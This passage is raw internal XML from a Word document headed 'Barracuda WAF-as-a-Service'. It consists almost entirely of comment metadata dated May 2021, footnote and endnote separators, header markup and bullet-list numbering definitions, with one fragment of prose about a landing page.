        <w:t xml:space="preserve">.  The main landing page is pretty good today for taking them on the right journey.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701616" w15:done="0"/>
  <w15:commentEx w15:paraId="323AF5E3" w15:paraIdParent="4E701616" w15:done="0"/>
  <w15:commentEx w15:paraId="2E64291A" w15:done="0"/>
  <w15:commentEx w15:paraId="6D59CA07" w15:done="0"/>
  <w15:commentEx w15:paraId="088A5185" w15:paraIdParent="6D59CA07" w15:done="0"/>
  <w15:commentEx w15:paraId="6C6ADC87" w15:paraIdParent="6D59CA07" w15:done="0"/>
  <w15:commentEx w15:paraId="11844206" w15:done="1"/>
  <w15:commentEx w15:paraId="2CC6D830" w15:done="0"/>
  <w15:commentEx w15:paraId="50E955A1" w15:done="0"/>
  <w15:commentEx w15:paraId="3DA0B8D4" w15:done="0"/>
  <w15:commentEx w15:paraId="7F717939" w15:done="0"/>
  <w15:commentEx w15:paraId="271DE759" w15:done="0"/>
  <w15:commentEx w15:paraId="15B75B20" w15:done="0"/>
  <w15:commentEx w15:paraId="6CA0004F" w15:done="0"/>
  <w15:commentEx w15:paraId="1292CF4C" w15:done="0"/>
  <w15:commentEx w15:paraId="47D78F1A" w15:done="0"/>
  <w15:commentEx w15:paraId="46614A17" w15:done="0"/>
  <w15:commentEx w15:paraId="59D816D0" w15:paraIdParent="46614A17" w15:done="0"/>
  <w15:commentEx w15:paraId="3399C0AC" w15:done="0"/>
  <w15:commentEx w15:paraId="2C81535D" w15:paraIdParent="3399C0AC" w15:done="0"/>
  <w15:commentEx w15:paraId="7867D832" w15:paraIdParent="3399C0AC" w15:done="0"/>
  <w15:commentEx w15:paraId="7F557026" w15:done="0"/>
  <w15:commentEx w15:paraId="1F41878C" w15:done="0"/>
  <w15:commentEx w15:paraId="28AF4B2F" w15:paraIdParent="1F41878C" w15:done="0"/>
  <w15:commentEx w15:paraId="2FFF9E28" w15:done="0"/>
  <w15:commentEx w15:paraId="5F115A3B" w15:paraIdParent="2FFF9E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07C1878" w16cex:dateUtc="2021-05-13T15:44:00Z"/>
  <w16cex:commentExtensible w16cex:durableId="7008745E" w16cex:dateUtc="2021-05-13T15:52:00Z"/>
  <w16cex:commentExtensible w16cex:durableId="3C674FEE" w16cex:dateUtc="2021-05-07T14:07:00Z"/>
  <w16cex:commentExtensible w16cex:durableId="0FFB6D8D" w16cex:dateUtc="2021-05-07T11:11:00Z"/>
  <w16cex:commentExtensible w16cex:durableId="4D66F8A8" w16cex:dateUtc="2021-05-07T15:36:00Z"/>
  <w16cex:commentExtensible w16cex:durableId="12B27395" w16cex:dateUtc="2021-05-13T15:58:00Z"/>
  <w16cex:commentExtensible w16cex:durableId="136A77D3" w16cex:dateUtc="2021-05-25T16:08:00Z"/>
  <w16cex:commentExtensible w16cex:durableId="1A49D6F5" w16cex:dateUtc="2021-05-25T16:08:00Z"/>
  <w16cex:commentExtensible w16cex:durableId="2EBBAA3E" w16cex:dateUtc="2021-05-25T16:07:00Z"/>
  <w16cex:commentExtensible w16cex:durableId="5DE71F56" w16cex:dateUtc="2021-05-25T16:12:00Z"/>
  <w16cex:commentExtensible w16cex:durableId="36752E0B" w16cex:dateUtc="2021-05-26T07:24:00Z"/>
  <w16cex:commentExtensible w16cex:durableId="0DD98173" w16cex:dateUtc="2021-05-26T07:29:00Z"/>
  <w16cex:commentExtensible w16cex:durableId="502FF6E2" w16cex:dateUtc="2021-05-26T07:32:00Z"/>
  <w16cex:commentExtensible w16cex:durableId="1F67B588" w16cex:dateUtc="2021-05-26T07:28:00Z"/>
  <w16cex:commentExtensible w16cex:durableId="2E4A061B" w16cex:dateUtc="2021-05-07T11:18:00Z"/>
  <w16cex:commentExtensible w16cex:durableId="3B035F5A" w16cex:dateUtc="2021-05-26T07:41:00Z"/>
  <w16cex:commentExtensible w16cex:durableId="2451F983" w16cex:dateUtc="2021-05-07T14:07:00Z"/>
  <w16cex:commentExtensible w16cex:durableId="537AD8E2" w16cex:dateUtc="2021-05-26T07:37:00Z"/>
  <w16cex:commentExtensible w16cex:durableId="08399E95" w16cex:dateUtc="2021-05-26T18:32:00Z"/>
  <w16cex:commentExtensible w16cex:durableId="2451F982" w16cex:dateUtc="2021-05-07T11:11:00Z"/>
  <w16cex:commentExtensible w16cex:durableId="2451F981" w16cex:dateUtc="2021-05-07T15:36:00Z"/>
  <w16cex:commentExtensible w16cex:durableId="2451F980" w16cex:dateUtc="2021-05-13T15:58:00Z"/>
  <w16cex:commentExtensible w16cex:durableId="15A725B1" w16cex:dateUtc="2021-05-25T16:19:00Z"/>
  <w16cex:commentExtensible w16cex:durableId="74FDEBD6" w16cex:dateUtc="2021-05-26T07:42:00Z"/>
  <w16cex:commentExtensible w16cex:durableId="448A4FF3" w16cex:dateUtc="2021-05-26T18:36:00Z"/>
  <w16cex:commentExtensible w16cex:durableId="7FC294F3" w16cex:dateUtc="2021-05-25T16:21:00Z"/>
  <w16cex:commentExtensible w16cex:durableId="2E4415E6" w16cex:dateUtc="2021-05-26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701616" w16cid:durableId="107C1878"/>
  <w16cid:commentId w16cid:paraId="323AF5E3" w16cid:durableId="7008745E"/>
  <w16cid:commentId w16cid:paraId="2E64291A" w16cid:durableId="3C674FEE"/>
  <w16cid:commentId w16cid:paraId="6D59CA07" w16cid:durableId="0FFB6D8D"/>
  <w16cid:commentId w16cid:paraId="088A5185" w16cid:durableId="4D66F8A8"/>
  <w16cid:commentId w16cid:paraId="6C6ADC87" w16cid:durableId="12B27395"/>
  <w16cid:commentId w16cid:paraId="11844206" w16cid:durableId="136A77D3"/>
  <w16cid:commentId w16cid:paraId="2CC6D830" w16cid:durableId="1A49D6F5"/>
  <w16cid:commentId w16cid:paraId="50E955A1" w16cid:durableId="2EBBAA3E"/>
  <w16cid:commentId w16cid:paraId="3DA0B8D4" w16cid:durableId="5DE71F56"/>
  <w16cid:commentId w16cid:paraId="7F717939" w16cid:durableId="0DD98173"/>
  <w16cid:commentId w16cid:paraId="271DE759" w16cid:durableId="502FF6E2"/>
  <w16cid:commentId w16cid:paraId="15B75B20" w16cid:durableId="1F67B588"/>
  <w16cid:commentId w16cid:paraId="6CA0004F" w16cid:durableId="36752E0B"/>
  <w16cid:commentId w16cid:paraId="1292CF4C" w16cid:durableId="2E4A061B"/>
  <w16cid:commentId w16cid:paraId="47D78F1A" w16cid:durableId="2451F983"/>
  <w16cid:commentId w16cid:paraId="46614A17" w16cid:durableId="537AD8E2"/>
  <w16cid:commentId w16cid:paraId="59D816D0" w16cid:durableId="08399E95"/>
  <w16cid:commentId w16cid:paraId="3399C0AC" w16cid:durableId="2451F982"/>
  <w16cid:commentId w16cid:paraId="2C81535D" w16cid:durableId="2451F981"/>
  <w16cid:commentId w16cid:paraId="7867D832" w16cid:durableId="2451F980"/>
  <w16cid:commentId w16cid:paraId="7F557026" w16cid:durableId="15A725B1"/>
  <w16cid:commentId w16cid:paraId="1F41878C" w16cid:durableId="74FDEBD6"/>
  <w16cid:commentId w16cid:paraId="28AF4B2F" w16cid:durableId="448A4FF3"/>
  <w16cid:commentId w16cid:paraId="2FFF9E28" w16cid:durableId="7FC294F3"/>
  <w16cid:commentId w16cid:paraId="5F115A3B" w16cid:durableId="2E4415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1183B" w14:textId="77777777" w:rsidR="005B5BA9" w:rsidRDefault="005B5BA9" w:rsidP="00172641">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="2BB3FA17" w14:textId="77777777" w:rsidR="005B5BA9" w:rsidRDefault="005B5BA9" w:rsidP="00172641">
      <w:r>
        <w:continuationSeparator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationNotice" w:id="1">
    <w:p w14:paraId="1162B341" w14:textId="77777777" w:rsidR="005B5BA9" w:rsidRDefault="005B5B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36740"/>
      <w:docPartObj>
        <w:docPartGallery w:val="Page Numbers (Bottom of Page)"/>
        <w:docPartUnique/>
      </w:docPartObj>
    </w:sdtPr>
    <w:sdtEndPr>
      <w:rPr>
        <w:noProof/>
      </w:rPr>
    </w:sdtEndPr>
    <w:sdtContent>
      <w:p w14:paraId="7DB94640" w14:textId="0387600D" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="00172641">
        <w:pPr>
          <w:pStyle w:val="Foot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7F3E01EC" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="00172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79DAA" w14:textId="77777777" w:rsidR="005B5BA9" w:rsidRDefault="005B5BA9" w:rsidP="00172641">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="6F025188" w14:textId="77777777" w:rsidR="005B5BA9" w:rsidRDefault="005B5BA9" w:rsidP="00172641">
      <w:r>
        <w:continuationSeparator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationNotice" w:id="1">
    <w:p w14:paraId="370CD6A5" w14:textId="77777777" w:rsidR="005B5BA9" w:rsidRDefault="005B5B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CEE0E" w14:textId="180D35D5" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="00172641">
    <w:pPr>
      <w:pStyle w:val="Header"/>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:noProof/>
        <w:color w:val="2B579A"/>
        <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
      </w:rPr>
      <mc:AlternateContent>
        <mc:Choice Requires="wps">
          <w:drawing>
            <wp:anchor distT="0" distB="0" distL="118745" distR="118745" simplePos="0" relativeHeight="251658240" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="0" wp14:anchorId="4DD6FA9B" wp14:editId="4B58D81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46BB7CD" w14:textId="7880CD44" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="00172641">
                              <w:pPr>
                                <w:pStyle w:val="Header"/>
                              </w:pPr>
                              <w:r>
                                <w:t>Barracuda WAF-as-a-Service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D6FA9B" id="Rectangle 197"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46BB7CD" w14:textId="7880CD44" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="00172641">
                        <w:pPr>
                          <w:pStyle w:val="Header"/>
                        </w:pPr>
                        <w:r>
                          <w:t>Barracuda WAF-as-a-Service</w:t>
                        </w:r>
                      </w:p>
                    </w:sdtContent>
                  </w:sdt>
                </w:txbxContent>
              </v:textbox>
              <w10:wrap type="square" anchorx="margin" anchory="page"/>
            </v:rect>
          </w:pict>
        </mc:Fallback>
      </mc:AlternateContent>
    </w:r>
  </w:p>
</w:hdr>
</file>

<file path=word/intelligence.xml><?xml version="1.0" encoding="utf-8"?>
<int:Intelligence xmlns:int="http://schemas.microsoft.com/office/intelligence/2019/intelligence">
  <int:IntelligenceSettings/>
  <int:Manifest>
    <int:WordHash hashCode="+hy8M85sF9u9T4" id="bLBiEny8"/>
    <int:WordHash hashCode="kajDhAlKYMTjji" id="vyY3P5Wu"/>
    <int:WordHash hashCode="wCgj9rKdcuGrsF" id="KAI/7B2G"/>
    <int:WordHash hashCode="NQmjNebJV7gKRy" id="Iyf4dBL+"/>
  </int:Manifest>
  <int:Observations>
    <int:Content id="bLBiEny8">
      <int:Rejection type="AugLoop_Text_Critique"/>
    </int:Content>
    <int:Content id="vyY3P5Wu">
      <int:Rejection type="AugLoop_Text_Critique"/>
    </int:Content>
    <int:Content id="KAI/7B2G">
      <int:Rejection type="AugLoop_Text_Critique"/>
    </int:Content>
    <int:Content id="Iyf4dB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D7DE4"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="FFFFFFFF"/>
    <w:lvl w:ilvl="0" w:tplc="EE5A91CA">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="5802D282">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="5462C114">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="C77A4200">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="54F815D0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="2AECFEF2">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="2A346294">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="3198DD82">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="465EE8DE">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="1" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="0D1A5FF1"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="FFFFFFFF"/>
    <w:lvl w:ilvl="0" w:tplc="EE8E4916">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="449A4AC2">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="5A9A5128">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="01EABD58">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="527E1BE4">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="6A747E5C">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="03425EA8">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="A7A038D6">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="BC0461D0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="2" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="0D3B518E"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="FFFFFFFF"/>
    <w:lvl w:ilvl="0" w:tplc="DC7AB232">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="CBA64360">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="3B0CB97E">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="A55C2F78">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="70B8BE3C">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="78D863C2">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="6802B606">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="A7A4F2F2">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="C6F8BF62">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="3" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="11EC46BD"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="FFFFFFFF"/>
    <w:lvl w:ilvl="0" w:tplc="1A36D872">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="285A8CD2">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="FB48BD0E">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="64CA2442">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="72BAD94C">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="D09460A4">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="13004074">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="026AFBAC">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="9652549C">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="4" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="13431663"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="A93E4960"/>
    <w:lvl w:ilvl="0" w:tplc="0409000F">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="9D843AAA">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%2."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="DFE4CE58">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%3."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="180"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="883E47F4">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%4."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="DF88DF04">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%5."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="25E413EC">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%6."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="180"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="9C529588">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%7."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="180E1E92">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%8."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
